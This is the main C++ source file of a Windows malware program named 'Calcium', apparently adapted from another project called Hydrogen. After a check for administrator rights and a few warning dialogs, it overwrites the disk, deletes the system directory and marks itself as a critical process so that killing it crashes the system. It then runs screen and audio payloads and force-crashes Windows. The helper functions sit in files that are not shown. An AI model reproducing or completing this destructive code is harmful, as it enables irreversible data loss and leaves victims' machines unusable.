#include "destruction.h"
#include "payloads.h"

// I copy many code because this is my first time using C++ and I don't know how to use that so... sorry lol :3
// Project Credits: LeoLezury/Hydrogen [main.cpp, def.h | timer.cpp, timer.h | destruction.cpp, destruction.h | payloads.cpp, payloads.h <PART> | virtual_screen.cpp, virtual_screen.h]

/* IMPORTANT - TEST MODE */
bool TEST_MODE = false; // This is important for developers when they test on VM to reduce time to re-install VM :)

/* Check if user executed with administrator rights (b) */
BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

// Sets the process-default DPI awareness to system-DPI awareness. This is equivalent to calling SetProcessDpiAwarenessContext with a DPI_AWARENESS_CONTEXT value of DPI_AWARENESS_CONTEXT_SYSTEM_AWARE.
// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setprocessdpiaware
void InitDPI() {
	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");

	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}

	FreeLibrary(hModUser32);
}

// C++ Start Function
int WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd
) {
	// (b)
	if (IsElevated() == FALSE) {
		TEST_MODE = true;
	}
	if (TEST_MODE == true) {
		int warn2x = MessageBox(NULL, L"Are you sure to execute this in Test Mode? Test Mode will not destroy your PC.\n\nIf you want to get your PC fucked, run with administrator.", L"Calcium Peaceful", MB_YESNO | MB_ICONQUESTION);
		if (warn2x != IDYES) {
			ExitProcess(0);
		}
	}
	else {
		// Warn User - First Warning
		int warn1 = MessageBox(NULL, L"You have just executed a malware.\nIf you don't want your PC dead, execute it WITHOUT administrator permissions.\nYou have a high chance losing all of your data if you continue.\nDo you still want to execute it, result in an unusable machine?", L"Calcium.exe", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
		if (warn1 != IDYES) {
			// (a) Exit Program as User mis-clicked the malware somehow ig
			ExitProcess(0);
		}
		// Warn User - Second Warning
		warn1 = MessageBox(NULL, L"THIS IS THE FINAL WARNING!!!\nTHE CREATOR OF THIS MALWARE WILL NOT BE RESPONSIBLE FOR ANY DESTRUCTION CAUSED BY THIS MALWARE.\nSTILL EXECUTE IT, RESULT IN AN UNUSABLE MACHINE?", L"Calcium.exe", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
		if (warn1 != IDYES) {
			// (a)
			ExitProcess(0);
		}
		// Credits
		warn1 = MessageBox(NULL, L"Your PC is FUCKED!\n\nCredits: LeoLezury/Hydrogen\nAudio Sequences are similar to Hydrogen.exe's!", L"Credits", MB_OK | MB_TOPMOST | MB_ICONINFORMATION);

	}
	// TEST_MODE_DISABLE - Destroy Windows //
	if (TEST_MODE == false) {
		WCHAR sysDir[MAX_PATH] = { 0 };
		GetSystemDirectory(sysDir, MAX_PATH);
		OverWriteDisk();
		DestroyDirectory(sysDir);
	}

	AUDIO_SEQUENCE_PARAMS pas[AUDIO_NUM] = { 0 };
	pas[0] = { 8000, 8000 * PAYLOAD_TIME_2, AudioSequence1 };
	pas[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
	pas[2] = { 8000, 8000 * PAYLOAD_TIME * 2, AudioSequence3 };
	pas[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };
	pas[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };

	SeedXorshift32((DWORD)__rdtsc()); // TBH I don't know why I add this as I don't even know how to use Shaders LOL
	if (TEST_MODE == false) {
		InitDPI();
	}
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
	if (TEST_MODE == false) {
		// If User Kills This Application, They will be greeted with a BSoD with Code CRITICAL_PROCESS_DIED
		SetCriticalProcess();
	}

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pas, 0, NULL);
	ExecutePayload(Payload1, PAYLOAD_TIME_2);
	ExecutePayload(Payload2, PAYLOAD_TIME);
	ExecutePayload(Payload3, PAYLOAD_TIME);
	// Load again for the cool effect :troll:
	ExecutePayload(Payload3, PAYLOAD_TIME);
	ExecutePayload(Payload4, PAYLOAD_TIME);
	ExecutePayload(Payload5, PAYLOAD_TIME);
	ExecutePayload(Payload6, PAYLOAD_TIME);
	// Terminate Windows
	if (TEST_MODE == false) {
		CrashWindows();
	}
	else {
		MessageBox(NULL, L"Payloads Ended. Mode: TEST_MODE [TerminationProcess_TEST]", L":)", MB_OK | MB_ICONINFORMATION);
		ExitProcess(0);
	}

	// Int Return
	return 0;
}